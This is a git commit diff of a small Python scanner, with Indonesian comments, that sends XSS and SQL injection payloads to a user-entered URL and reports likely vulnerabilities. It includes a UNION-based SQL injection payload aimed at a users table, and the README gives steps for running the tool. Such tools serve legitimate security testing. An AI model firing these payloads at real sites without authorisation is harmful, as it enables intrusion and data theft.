421484d211c5eee7760e52cc2089a4a447938ca6
Razan <razanaditya77@gmail.com>
2024-06-28 16:01:51 +0700

    update sql injection & test for vurnerabilities

--- README.md
+++ README.md
@@ -1,1 +1,12 @@
-# SQL-Injection
+# Basic XSS & SQL Injection in Python
+
+A simple python project to test XSS & SQL Injection vulnerabilities on a website.
+
+### Step by Step how to run the python script
+
+```
+git clone https://github.com/RazanPtr/XSS-SQL-Injection.git
+cd sql-injection
+pip install requests beautifulsoup4
+python main.py
+```
--- main.py
+++ main.py
@@ -89,15 +89,43 @@ sql_payloads = [
     "\") union select * from users--"
 ]
 
-# Fungsi untuk menguji kerentanan XSS
+# Fungsi untuk menguji XSS Vulnerabilities
 def test_xss(url):
-    print(f"Menguji {url} untuk kerentanan XSS...")
+    print(f"Menguji {url} untuk XSS Vulnerabilities...")
     for payload in xss_payloads:
         # Mengirimkan permintaan dengan payload XSS
         response = requests.get(url, params={'input': payload})
         # Memeriksa apakah payload tercermin dalam respons
         if payload in response.text:
-            print(f"Potensi kerentanan XSS terdeteksi dengan payload: {payload}")
+            print(f"Potensi XSS Vulnerabilities terdeteksi dengan payload: {payload}")
             return True
-    print("Tidak ada kerentanan XSS yang terdeteksi.")
+    print("Tidak ada XSS Vulnerabilities yang terdeteksi.")
     return False
+
+# Fungsi untuk menguji SQL Injection Vulnerabilities
+def test_sql_injection(url):
+    print(f"Menguji {url} untuk SQL Injection Vulnerabilities...")
+    for payload in sql_payloads:
+        # Mengirimkan permintaan dengan payload SQL
+        response = requests.get(url, params={'input': payload})
+        # Memeriksa apakah respons menunjukkan SQL injection yang berhasil
+        if "error" in response.text or "SQL" in response.text or "syntax" in response.text:
+            print(f"Potensi SQL Injection Vulnerabilities terdeteksi dengan payload: {payload}")
+            return True
+    print("Tidak ada SQL Injection Vulnerabilities yang terdeteksi.")
+    return False
+
+# Fungsi utama untuk menguji XSS vulnerabilities dan SQL Injection pada URL tertentu
+def test_vulnerabilities(url):
+    xss_found = test_xss(url)
+    sql_injection_found = test_sql_injection(url)
+    
+    if xss_found or sql_injection_found:
+        print("Vulnerabilities ditemukan.")
+    else:
+        print("Tidak ada vulnerabilities yang ditemukan.")
+
+# Mendapatkan input URL dari pengguna
+if __name__ == "__main__":
+    target_url = input("Masukkan URL aplikasi web yang akan diuji: ")
+    test_vulnerabilities(target_url)
